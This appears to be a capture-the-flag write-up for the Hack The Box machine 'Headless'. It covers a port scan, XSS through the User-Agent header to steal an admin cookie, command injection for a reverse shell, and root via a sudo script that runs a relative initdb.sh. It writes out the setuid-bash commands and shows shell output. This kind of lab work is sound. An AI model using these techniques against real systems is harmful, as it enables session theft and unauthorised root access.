---
title: HTB:Headless
date: 2024-03-27
categories: [HTB, LINUX]
tags: [htb, linux] # TAG names should always be lowercase
image:
  path: https://i.ibb.co/9NMtTrq/headless.jpg
---

## Recon

### Nmap

    kali@kali ~> nmap -sCV 10.10.11.8
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-26 02:27 EDT
    Nmap scan report for headless.htb (10.10.11.8)
    Host is up (0.16s latency).
    Not shown: 998 closed tcp ports (conn-refused)
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
    | ssh-hostkey: 
    |   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
    |_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
    5000/tcp open  upnp?
    | fingerprint-strings: 
    |   GetRequest: 
    |     HTTP/1.1 200 OK
    |     Server: Werkzeug/2.2.2 Python/3.11.2
    |     Date: Tue, 26 Mar 2024 06:25:09 GMT
    |     Content-Type: text/html; charset=utf-8
    |     Content-Length: 2799
    |     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
    |     Connection: close
    |     <!DOCTYPE html>
    |     <html lang="en">
    |     <head>
    |     <meta charset="UTF-8">
    |     <meta name="viewport" content="width=device-width, initial-scale=1.0">
    |     <title>Under Construction</title>
    |     <style>
    |     body {
    |     font-family: 'Arial', sans-serif;
    |     background-color: #f7f7f7;
    |     margin: 0;
    |     padding: 0;
    |     display: flex;
    |     justify-content: center;
    |     align-items: center;
    |     height: 100vh;
    |     .container {
    |     text-align: center;
    |     background-color: #fff;
    |     border-radius: 10px;
    |     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
    |   RTSPRequest: 
    |     <!DOCTYPE HTML>
    |     <html lang="en">
    |     <head>
    |     <meta charset="utf-8">
    |     <title>Error response</title>
    |     </head>
    |     <body>
    |     <h1>Error response</h1>
    |     <p>Error code: 400</p>
    |     <p>Message: Bad request version ('RTSP/1.0').</p>
    |     <p>Error code explanation: 400: Bad request syntax or unsupported method.</p>
    |     </body>
    |_    </html>
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port5000-TCP:V=7.94SVN%I=7%D=3/26%Time=66026AFD%P=x86_64-pc-linux-gnu%r
    SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
    SF:x20Python/3\.11\.2\r\nDate:\x20Tue,\x2026\x20Mar\x202024\x2006:25:09\x2
    SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
    SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
    SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
    SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
    SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
    SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
    SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
    SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
    SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
    SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
    SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
    SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
    SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
    SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
    SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
    SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
    SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
    SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
    SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
    SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
    SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
    SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
    SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
    SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
    SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
    SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
    SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
    SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 153.97 seconds

**Open Ports**:

-   Port 22: SSH (OpenSSH 9.2p1 Debian 2+deb12u2)
-   Port 5000: A web service running Werkzeug/2.2.2 Python/3.11.2.

### Directory Bruteforce

![dir](https://i.ibb.co/kcBXkrJ/dir.jpg)

**Directories**:
- /dashboard
- /support

### Site: 5000/TCP
![support](https://i.ibb.co/HGRNTyk/support.jpg)

![dashboard](https://i.ibb.co/J5XXHH7/dashboard.jpg%20https://i.ibb.co/HGRNTyk/support.jpg)

It seems we don't have permission to access this page yet.

## Shell as User

### XSS

After going through a bunch of payloads, I found the most suitable one for this.

```javascript

```

![xss](https://i.ibb.co/dtM3J5B/xss.jpg)

Inject the XSS payload into the user agent. Entering `<>` in the message field will result in a hacking attempt on the site. When the administrator reviews your hacking attempt, your malicious payload is executed and you receive the admin cookie on your local server.

![admin_cookie](https://i.ibb.co/2FSFnGC/admin-cookie.jpg)

The administrator dashboard can be accessed by replacing the admin cookie.

![admin](https://i.ibb.co/w0z6zFR/admin.jpg)

### Command injection

To get a reverse shell, use command injection on the date field.

![admin_injection](https://i.ibb.co/qpTn4DR/admin-injection.jpg)

![payload](https://i.ibb.co/PDv8qX9/payload.jpg)

![shell](https://i.ibb.co/cY9XFW8/shell.jpg)

There you go ...

### User Flag

    bash-5.2$ id
    id
    uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
    bash-5.2$ pwd
    pwd
    /home/dvir/app
    bash-5.2$ ls
    ls
    app.py  dashboard.html  hackattempt.html  hacking_reports  index.html  inspect_reports.py  report.sh  support.html
    bash-5.2$ cd /home
    cd /home
    bash-5.2$ ls
    ls
    dvir
    bash-5.2$ cd dvir
    cd dvir
    bash-5.2$ ls
    ls
    app  geckodriver.log  initdb.sh  initdb.sh.1  user.txt
    bash-5.2$ cat user.txt
    cat user.txt
    c5eed60774ca6d843b6d8444da1b0***

## Shell as Root

### Enumeration

    $ sudo -l
    Matching Defaults entries for dvir on headless:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
        use_pty
    
    User dvir may run the following commands on headless:
        (ALL) NOPASSWD: /usr/bin/syscheck

The user can execute `/usr/bin/syscheck` as root using `sudo`

    $ strings /usr/bin/syscheck
    #!/bin/bash
    if [ "$EUID" -ne 0 ]; then
      exit 1
    last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
    formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
    /usr/bin/echo "Last Kernel Modification Time: $formatted_time"
    disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
    /usr/bin/echo "Available disk space: $disk_space"
    load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
    /usr/bin/echo "System load average: $load_average"
    if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
      /usr/bin/echo "Database service is not running. Starting it..."
      ./initdb.sh 2>/dev/null
    else
      /usr/bin/echo "Database service is running."
    exit 0

ChatGPT gives us a better explanation of what's going on here.

![chatgpt](https://i.ibb.co/gJss1YK/chatgpt.jpg)

### Root flag

Create a file named  `initdb.sh` with the payload (that sets the setuid permission on /bin/bash)  & run /usr/bin/syscheck with root privileges. 

```bash
echo "chmod u+s /bin/bash" > initdb.sh
chmod +x initdb.sh
```

`bash -p` will launch the Bash shell with privileged permissions.

    bash-5.2$ echo "chmod u+s /bin/bash" > initdb.sh
    echo "chmod u+s /bin/bash" > initdb.sh
    bash-5.2$ chmod +x initdb.sh
    chmod +x initdb.sh
    bash-5.2$ sudo /usr/bin/syscheck
    sudo /usr/bin/syscheck
    Last Kernel Modification Time: 01/02/2024 10:05
    Available disk space: 1.9G
    System load average:  0.09, 0.14, 0.10
    Database service is not running. Starting it...
    bash-5.2$ /bin/bash -p
    /bin/bash -p
    bash-5.2# id
    id
    uid=1000(dvir) gid=1000(dvir) euid=0(root) groups=1000(dvir),100(users)
    bash-5.2# cd /root
    cd /root
    bash-5.2# ls
    ls
    root.txt
    bash-5.2# cat root.txt
    cat root.txt
    52937c649ac4ca89557894efed1e8***

